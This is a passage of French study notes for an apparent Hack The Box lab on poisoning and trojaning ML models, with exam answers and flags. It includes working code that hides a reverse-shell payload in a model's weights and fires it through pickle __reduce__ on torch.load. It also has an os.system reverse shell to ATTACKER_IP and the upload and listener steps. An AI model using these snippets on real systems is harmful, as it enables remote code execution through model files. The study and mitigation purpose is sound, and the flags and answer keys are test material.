`__init__` pickle le `modified_state_dict` et stocke `target_key`, `num_lsb`. `__reduce__` renvoie **`(exec, (loader_code,))`** : une string auto-contenue qui, au unpickling, (1) redéfinit `decode_lsb`, (2) reconstruit le state_dict, (3) extrait le tensor à `target_key`, (4) `decode_lsb` récupère les bytes, (5) `exec` le payload (reverse shell). Tout (données + params + helper + trigger) est plié dans **un seul fichier** `.pth`.
```python
class TrojanModelWrapper:
    def __init__(self, modified_state_dict, target_key, num_lsb):
        # validations (target_key présent, tensor float32, 1<=num_lsb<=8)
        self.pickled_state_dict_bytes = pickle.dumps(modified_state_dict)
        self.target_key = target_key
        self.num_lsb = num_lsb

    def __reduce__(self):
        decode_lsb_source = """<source de decode_lsb en string>"""
        pickled_state_dict_literal = repr(self.pickled_state_dict_bytes)
        loader_code = f"""
import pickle, torch, struct, traceback, os, pty, socket, sys, subprocess
{decode_lsb_source}
pickled_state_dict_bytes = {pickled_state_dict_literal}
target_key = {repr(self.target_key)}
num_lsb = {self.num_lsb}
reconstructed_state_dict = pickle.loads(pickled_state_dict_bytes)
payload_tensor = reconstructed_state_dict[target_key]
extracted_payload_bytes = decode_lsb(payload_tensor, num_lsb)
extracted_payload_code = extracted_payload_bytes.decode('utf-8', errors='replace')
exec(extracted_payload_code, globals(), locals())      # reverse shell
"""
        return (exec, (loader_code,))
```

### Exécution & upload (dockerisé)
```python
wrapper_instance = TrojanModelWrapper(modified_state_dict, target_key, NUM_LSB)
torch.save(wrapper_instance, "malicious_trojan_model.pth")   # pickle le wrapper malveillant
```
1. Lancer un listener : **`nc -lvnp 4444`**.
2. POST le fichier à l'endpoint `/upload` de l'app (Flask, clé de form = `model`) :
```python
api_url = "http://localhost:5555/upload"
files_to_upload = {"model": (os.path.basename(final_malicious_file),
                             open(final_malicious_file, "rb"), "application/octet-stream")}
response = requests.post(api_url, files=files_to_upload)
```
3. Le serveur fait `torch.load()` → `__reduce__` s'exécute → reverse shell → `cat /app/flag.txt`.

### 🎯 Questions (section) — Exercice Pickle Reverse Shell
- **id 3091** : « Using the reverse shell to your target instance, retrieve the flag in flag.txt ... »
- **Flag** : `HTB{D0ck3r1z3d_P1ckl3_Sh3ll_!n_Th3_M0d3l}`
- **Démarche** : mettre `HOST_IP` à ton IP HTB, construire le payload reverse shell, l'embed via `encode_lsb` (NUM_LSB=2) dans `large_layer.weight`, wrapper via `TrojanModelWrapper`, `torch.save`, lancer `nc -lvnp 4444`, POST à `/upload` ; à réception du shell, `cat /app/flag.txt`.

> 🎯 **Exam** — Quel argument de `torch.load` bloque cette attaque ? **`weights_only=True`** (défaut récent). L'attaque exige `weights_only=False`. Quelle méthode magique fournit la RCE ? **`__reduce__`**, en renvoyant `(exec, (loader_code,))`.

---

## 7. Skills Assessment

- **id 3096** : Cibler un classifieur **4-classes One-vs-Rest Logistic Regression**. But : **poison par label flipping uniquement** pour rendre la classification de **Class 1 ambiguë** — les vrais Class 1 doivent être fréquemment prédits comme **Class 0 ou Class 2**, dégradant l'accuracy de Class 1. Implémenter dans le notebook template, soumettre le modèle empoisonné à l'API.
- **Flag** : `HTB{4mbiguity_m4st3r}`
- **Démarche** : combiner deux flips ciblés sur la Class 1 — flipper une partie des Class 1 vers Class 0 ET une partie vers Class 2 (répartir pour créer l'ambiguïté des deux côtés), de sorte que la boundary OvR de Class 1 se rétracte des deux côtés. Entraîner l'OvR 4 classes, POST → flag.

---

## 🎯 Questions d'examen probables

1. **Q : Différence entre AI data attacks, evasion attacks et privacy attacks ?**
   R : Data attacks corrompent les données d'apprentissage/l'artefact modèle (agissent avant l'inférence) ; evasion manipule les inputs à l'inférence ; privacy extrait des infos mémorisées.

2. **Q : Sous quel item OWASP LLM tombe le data poisoning ? Et le modèle trojanisé / pickle ?**
   R : Poisoning = **LLM03 (Training Data Poisoning)** ; supply chain / artefact modèle altéré + désérialisation = **LLM05 (Supply Chain Vulnerabilities)**.

3. **Q : Que modifie le label flipping vs le clean label attack ?**
   R : Label flipping change **les labels** (features intactes) ; clean label change **les features** (labels intacts et plausibles).

4. **Q : Dans `flip_labels`, comment calcule-t-on le nombre de labels à inverser pour 60 % ?**
   R : `n_to_flip = int(len(y) * 0.60)`, indices choisis sans remise via `np.random.default_rng(SEED).choice(...)`, inversion via `np.where(orig==0, 1, 0)`.

5. **Q : Dans le targeted flip, le pourcentage s'applique au dataset entier ?**
   R : Non — uniquement au **nombre de samples de la target_class** (`int(n_target_samples * poison_percentage)`).

6. **Q : Sur quel jeu de données évalue-t-on TOUJOURS un modèle empoisonné ?**
   R : Sur le **test set propre** (`X_test`, `y_test`, vrais labels) — pour mesurer l'impact réel.

7. **Q : Résultat du targeted flip (40 % Class 1→0) sur l'accuracy et le recall ?**
   R : Accuracy 0.9933 → **0.8100** ; Class 1 recall → **0.61** ; **57 False Negatives**.

8. **Q : Modèle utilisé pour le clean label attack (3 classes) ?**
   R : **`OneVsRestClassifier(LogisticRegression(C=1.0, solver="liblinear"))`**, données `make_blobs` standardisées (`StandardScaler`), baseline ≈ 0.96.

9. **Q : Comment choisit-on la cible dans le clean label attack ?**
   R : Un vrai Class 1 avec `f_01(x)=(w0-w1)^T x+(b0-b1) < 0` mais **le plus proche de 0** (argmax des valeurs négatives) — le plus vulnérable à un décalage de boundary. Démo : index 373.

10. **Q : Direction et magnitude de la perturbation clean label ?**
    R : Direction = **`-(w0-w1)` normalisée** (opposée au normal de la boundary, pour pousser Class 0 vers Class 1) ; magnitude `epsilon_cross = 0.25`.

11. **Q : Qu'est-ce qu'un Trojan/backdoor attack et comment le mesure-t-on ?**
    R : Logique cachée activée par un **trigger** ; modèle normal sinon. Mesure = **ASR** (% d'images source triggées prédites comme target_class), démo **100 %** avec CA préservée (~97.5 %).

12. **Q : Paramètres du trigger GTSRB ?**
    R : Carré **4×4 magenta (1.0,0.0,1.0)** au **coin bas-droit** (`IMG_SIZE-TRIGGER_SIZE-1`), `SOURCE_CLASS=14` (Stop) → `TARGET_CLASS=3` (Speed limit 60), `POISON_RATE=0.10`.

13. **Q : Dans le PoisonedTrain vs TriggeredTest, quelle différence sur les labels ?**
    R : PoisonedTrain **change le label** des source empoisonnées en target_class ; TriggeredTest applique le trigger à toutes les images mais **garde les labels originaux** (nécessaire pour calculer l'ASR).

14. **Q : Pourquoi `pickle`/`torch.load` sont dangereux et quelle est la mitigation ?**
    R : `pickle.load()` appelle `__reduce__` qui peut renvoyer un callable arbitraire (`exec`) → RCE. Mitigation : **`torch.load(path, weights_only=True)`** (défaut récent) qui refuse `__reduce__`. L'attaque exige `weights_only=False`.

15. **Q : Comment le payload est-il caché dans le modèle et récupéré ?**
    R : Reverse shell encodé en bytes, caché dans les **LSB** (`NUM_LSB=2`) du tensor `large_layer.weight` via `encode_lsb` (préfixe longueur 4 bytes big-endian `>I`). `__reduce__` renvoie `(exec, (loader_code,))` qui redécode via `decode_lsb` et `exec`.

16. **Q : Capacité de stockage stego pour un tensor de 20480 float32 avec 2 LSB ?**
    R : `20480 × 2 / 8 = 5120 bytes` (5 kB).

17. **Q : Étapes finales pour obtenir le shell/flag pickle ?**
    R : `nc -lvnp 4444`, POST le `.pth` malveillant à `/upload` (Flask, clé `model`), le serveur `torch.load()` déclenche `__reduce__` → reverse shell → `cat /app/flag.txt`.

18. **Q : SEED global du module ?**
    R : **1337** (numpy, torch, random).

### Récapitulatif des flags
| Exercice | id | Flag |
|---|---|---|
| Label Flipping (60 %) | 3095 | `HTB{l4b3l_fl1pp1ng_pwnz_d3f4ult}` |
| Targeted Label Flip (≥50 % class 0→1) | 3033 | `HTB{l4b3l_fl1pp1ng_targeted_pwnz}` |
| Clean Label (Class 2 idx 334 → Class 1) | 3034 | `HTB{cl3an_l4b3l_fl4g_fun}` |
| Trojan MNIST (7→1, trigger blanc bas-gauche) | 3035 | `HTB{mN15t_Tr0j4n_5ucc3s5fUl!}` |
| Pickle reverse shell (flag.txt) | 3091 | `HTB{D0ck3r1z3d_P1ckl3_Sh3ll_!n_Th3_M0d3l}` |
| Skills Assessment (OvR 4-classes, Class 1 ambiguë) | 3096 | `HTB{4mbiguity_m4st3r}` |

---

## 🧪 Snippets réutilisables

### A. Label flip aléatoire (dégradation générale)
```python
def flip_labels(y, poison_percentage):
    n_to_flip = int(len(y) * poison_percentage)
    if n_to_flip == 0: return y.copy(), np.array([], dtype=int)
    rng = np.random.default_rng(SEED)
    idx = rng.choice(len(y), size=n_to_flip, replace=False)
    y_p = y.copy()
    y_p[idx] = np.where(y_p[idx] == 0, 1, 0)   # inversion binaire
    return y_p, idx
```

### B. Targeted flip (classe cible → nouvelle classe)
```python
def targeted_class_label_flip(y, poison_percentage, target_class, new_class, seed=1337):
    target_idx = np.where(y == target_class)[0]
    n = int(len(target_idx) * poison_percentage)
    if n == 0: return y.copy(), np.array([], dtype=int)
    rng = np.random.default_rng(seed)
    chosen = target_idx[rng.choice(len(target_idx), size=n, replace=False)]
    y_p = y.copy(); y_p[chosen] = new_class
    return y_p, chosen
# usage exam id 3033 : targeted_class_label_flip(y_train, 0.50, target_class=0, new_class=1)
```

### C. Clean label — perturber des voisins vers l'autre classe (sans changer les labels)
```python
# boundary i-vs-j : w_diff = w_i - w_j ; b_diff = b_i - b_j ; f(x)=w_diff@x+b_diff
w_diff = w0_base - w1_base
unit_push = (-w_diff) / np.linalg.norm(-w_diff)      # pousse classe i -> classe j
delta = 0.25 * unit_push                              # epsilon_cross = 0.25
nn = NearestNeighbors(n_neighbors=5).fit(X_class0)    # voisins de la classe à perturber
_, rel = nn.kneighbors(X_target.reshape(1, -1))
for gi in class0_indices[rel.flatten()]:
    X_train_poisoned[gi] = X_train[gi] + delta        # label INCHANGÉ
```

### D. Insertion de trigger (image tensor C×H×W en [0,1])
```python
def add_trigger(img, size=4, color=(1.0, 1.0, 1.0), pos=None):   # blanc par défaut (MNIST)
    c, h, w = img.shape
    if pos is None: pos = (0, h - size - 1)          # ex. bas-gauche : x=0, y=h-size-1
    sx, sy = pos
    col = torch.tensor(color[:c] if c <= len(color) else color, dtype=img.dtype).view(c, 1, 1)
    img[:, sy:sy+size, sx:sx+size] = col
    return img
# MNIST 7->1 (exam id 3035) : trigger blanc, coin bas-gauche ; poison des '7', label -> 1
```

### E. Pickle __reduce__ — payload RCE (schéma minimal)
```python
import os, pickle
class Exploit:
    def __reduce__(self):
        # renvoie (callable, args) exécuté par pickle.load()
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'",))
        # variante exec : return (exec, ("<code python>",))
payload = pickle.dumps(Exploit())        # ou torch.save(Exploit(), "model.pth")
# Côté victime vulnérable : pickle.loads(payload) / torch.load("model.pth", weights_only=False) -> RCE
```

### F. Stego LSB — encode/decode (préfixe longueur 4 bytes big-endian)
```python
import struct
def encode_lsb(t, data, num_lsb):                     # t: float32 tensor
    tf = t.clone().detach().flatten()
    blob = struct.pack(">I", len(data)) + data        # longueur + payload
    bits = ''.join(f'{b:08b}' for b in blob)
    mask = (1 << num_lsb) - 1
    for e in range((len(bits) + num_lsb - 1)//num_lsb):
        chunk = int(bits[e*num_lsb:(e+1)*num_lsb].ljust(num_lsb, '0'), 2)
        i = struct.unpack(">I", struct.pack(">f", tf[e].item()))[0]
        tf[e] = struct.unpack(">f", struct.pack(">I", (i & ~mask) | chunk))[0]
    return tf.reshape(t.shape)
# capacité bytes = floor(numel * num_lsb / 8) ; ex 20480 * 2 / 8 = 5120
```

### G. Upload du modèle malveillant + listener
```bash
nc -lvnp 4444        # listener attaquant
```
```python
files = {"model": ("model.pth", open("malicious_trojan_model.pth", "rb"), "application/octet-stream")}
requests.post("http://TARGET:5555/upload", files=files)   # serveur torch.load() -> shell
```
